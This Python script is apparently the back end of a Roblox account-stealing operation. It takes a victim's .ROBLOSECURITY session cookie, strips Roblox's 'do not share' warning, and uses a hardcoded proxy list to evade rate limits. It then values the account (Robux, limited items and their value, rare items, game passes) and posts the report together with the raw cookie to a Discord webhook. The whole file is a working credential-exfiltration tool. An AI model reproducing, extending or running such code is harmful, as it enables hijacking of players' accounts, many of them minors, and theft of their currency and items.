import sys
import os
import re
import time
import random
import requests
from datetime import datetime, timezone

# Your proxy list for Render bypass
RAW_PROXY_LIST = """
socks5://213.165.54.5:1080
socks4://46.8.104.176:1080
http://5.129.254.243:8888
http://5.129.254.49:8888
socks5://93.100.82.163:1080
socks5://80.79.241.118:1080
socks5://185.9.73.44:1080
socks5://46.161.49.174:10808
http://5.129.254.51:8888
http://5.129.254.154:8888
http://5.129.254.60:8888
http://147.45.164.178:8888
socks5://77.91.108.85:1080
http://5.129.254.129:8888
http://5.129.254.5:8888
socks5://217.69.222.174:1080
http://5.129.254.215:8888
socks5://83.234.87.145:1080
socks5://82.142.130.102:1080
http://20.52.234.254:3128
"""

# Special items by asset ID (verified against catalog)
SPECIAL_ASSETS = {
    "Korblox Deathspeaker": 139607718,
    "Headless Horseman": 134082579,
    "Violet Valkyrie": 1402432199,
}

# Games mapped to universe IDs
GAMES = {
    "adopt me": 383310974,
    "mm2": 66654135,
    "ps99": 3317771874,
}

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    return cookie.lstrip('.').rstrip(';').strip()

def get_working_session(roblosecurity):
    session = requests.Session()
    if roblosecurity:
        session.cookies.set(".ROBLOSECURITY", roblosecurity, domain=".roblox.com")
    
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com/"
    })

    manual_proxy = os.environ.get('PROXY_URL')
    proxies_to_try = [manual_proxy] if manual_proxy else []
    parsed_proxies = [line.strip() for line in RAW_PROXY_LIST.strip().splitlines() if line.strip()]
    random.shuffle(parsed_proxies)
    proxies_to_try.extend(parsed_proxies)

    for p in proxies_to_try:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            test_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
            if test_res.status_code != 429:
                return session, test_res
        except Exception:
            continue

    session.proxies = {}
    fallback_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
    return session, fallback_res

def api_get(session, url, **kwargs):
    """Reliability helper: sleeps 0.3s between calls, retries once after 3s on HTTP 429, returns None on failure."""
    for attempt in range(2):
        try:
            r = session.get(url, timeout=10, **kwargs)
            if r.status_code == 429:
                if attempt == 0:
                    time.sleep(3)
                    continue
                return None
            time.sleep(0.3)
            if r.status_code == 200:
                try:
                    return r.json()
                except ValueError:
                    return None
            return None
        except Exception:
            if attempt == 0:
                time.sleep(1)
                continue
            return None
    return None

def main():
    try:
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("DEBUG ERROR: DISCORD_WEBHOOK_URL is missing!", file=sys.stderr)
            sys.exit(1)

        if len(sys.argv) < 2:
            print("DEBUG: No cookie provided in sys.argv[1]", file=sys.stderr)
            sys.exit(1)
        
        roblosecurity = extract_and_clean_cookie(sys.argv[1])
        session, auth_res = get_working_session(roblosecurity)
        
        user_id = None
        username = "Unknown User"
        display_name = "Unknown"
        age_days = 0
        robux = 0
        pending = 0
        rap = 0
        lim_count = 0
        premium = False
        games_data = {}
        special_owned = {}

        if auth_res.status_code == 200:
            auth_data = auth_res.json()
            user_id = auth_data.get("id")
            if user_id:
                username = auth_data.get("name", "Unknown")
                display_name = auth_data.get("displayName", username)

                # Account age
                user_info = api_get(session, f"https://users.roblox.com/v1/users/{user_id}")
                if user_info:
                    created = user_info.get("created", "")
                    if created:
                        try:
                            age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days
                        except Exception:
                            pass

                # Robux balance
                curr_res = api_get(session, "https://economy.roblox.com/v1/user/currency")
                if curr_res:
                    robux = curr_res.get("robux", 0)

                # Pending robux
                trans_res = api_get(session, f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals", params={"timeFrame": "Month", "transactionType": "summary"})
                if trans_res:
                    pending = trans_res.get("pendingRobuxTotal", 0)

                # Premium status
                prem_res = api_get(session, f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership")
                if isinstance(prem_res, bool):
                    premium = prem_res
                elif isinstance(prem_res, dict):
                    premium = prem_res.get("isMember", False)

                # Limiteds & RAP (paginated)
                collectibles, cursor = [], ""
                while True:
                    res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles", params={"limit": 100, "sortOrder": "Asc", "cursor": cursor})
                    if not res or "data" not in res:
                        collectibles = None
                        break
                    collectibles += res["data"]
                    cursor = res.get("nextPageCursor")
                    if not cursor:
                        break
                
                if collectibles is not None:
                    lim_count = len(collectibles)
                    rap = sum(c.get("recentAveragePrice", 0) or 0 for c in collectibles)
                else:
                    lim_count = "inventory private"
                    rap = "inventory private"

                # Special Items ownership
                for item_name, asset_id in SPECIAL_ASSETS.items():
                    asset_res = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}")
                    special_owned[item_name] = bool(asset_res and asset_res.get("data"))

                # Games processing (badges and gamepasses)
                for game_name, universe_id in GAMES.items():
                    played = False
                    badge_ids, badge_cursor = [], ""
                    while True:
                        b_res = api_get(session, f"https://badges.roblox.com/v1/universes/{universe_id}/badges", params={"limit": 100, "cursor": badge_cursor})
                        if not b_res or "data" not in b_res:
                            break
                        badge_ids += [b["id"] for b in b_res["data"]]
                        badge_cursor = b_res.get("nextPageCursor")
                        if not badge_cursor:
                            break
                    
                    if badge_ids:
                        for i in range(0, len(badge_ids), 100):
                            chunk = badge_ids[i:i + 100]
                            award_res = api_get(session, f"https://badges.roblox.com/v1/users/{user_id}/badges/awarded-dates", params={"badgeIds": ",".join(map(str, chunk))})
                            if award_res and award_res.get("data"):
                                played = True
                                break

                    # Gamepasses ownership check
                    passes, pass_cursor = [], ""
                    while True:
                        p_res = api_get(session, f"https://games.roblox.com/v1/games/{universe_id}/game-passes", params={"limit": 100, "cursor": pass_cursor})
                        if not p_res or "data" not in p_res:
                            break
                        passes += [p["id"] for p in p_res["data"]]
                        pass_cursor = p_res.get("nextPageCursor")
                        if not pass_cursor:
                            break
                    
                    owned_passes = 0
                    for pid in passes:
                        pass_inv = api_get(session, f"https://inventory.roblox.com/v1/users/{user_id}/items/GamePass/{pid}")
                        if pass_inv and pass_inv.get("data"):
                            owned_passes += 1

                    if owned_passes > 0:
                        played = True

                    games_data[game_name] = {"played": played, "passes": owned_passes}

        avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com/images/icon_certificate.png"
        
        games_str = "\n".join([f"+ {g.title()}: {d['played']} ({d['passes']} passes)" for g, d in games_data.items()]) if games_data else "N/A"
        special_str = "\n".join([f"+ {name}: {owned}" for name, owned in special_owned.items()]) if special_owned else "N/A"

        embed_stats = {
            "title": "📢 Discord Notification 📢",
            "description": f"```ini\n[ ⚡ Stats ] • [ 🌐 Profile ]\n```\n🔗 **[Stats Link](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
            "color": 0x2B2D31,
            "thumbnail": {"url": avatar_url},
            "fields": [
                {"name": "🐱 Username", "value": f"```ini\n{username}\n```", "inline": False},
                {"name": "📊 Account Stats", "value": f"```diff\n+ Account Age: {age_days} Days\n+ Premium: {premium}\n```", "inline": False},
                {"name": "🪙 Robux", "value": f"```ini\nBalance: {robux:,} if isinstance(robux, int) else robux\nPending: {pending:,} if isinstance(pending, int) else pending\n```", "inline": True},
                {"name": "💎 Limiteds", "value": f"```ini\nRAP: {rap}\nLimiteds: {lim_count}\n```", "inline": True},
                {"name": "👑 Special Items", "value": f"```diff\n{special_str}\n```", "inline": False},
                {"name": "⭐ Games & Passes", "value": f"```diff\n{games_str}\n```", "inline": False}
            ],
            "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
            "timestamp": datetime.now(timezone.utc).isoformat()
        }

        embed_cookie = {
            "title": "🍪 Session Cookie Data",
            "description": f"```text\n{roblosecurity}\n```",
            "color": 0x2B2D31,
            "footer": {"text": f"Token Length: {len(roblosecurity)} chars"}
        }

        payload = {
            "username": f"{display_name} | Stats",
            "avatar_url": avatar_url,
            "embeds": [embed_stats, embed_cookie]
        }

        requests.post(webhook_url, json=payload, timeout=10)

    except Exception as e:
        print(f"DEBUG CRITICAL EXCEPTION: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
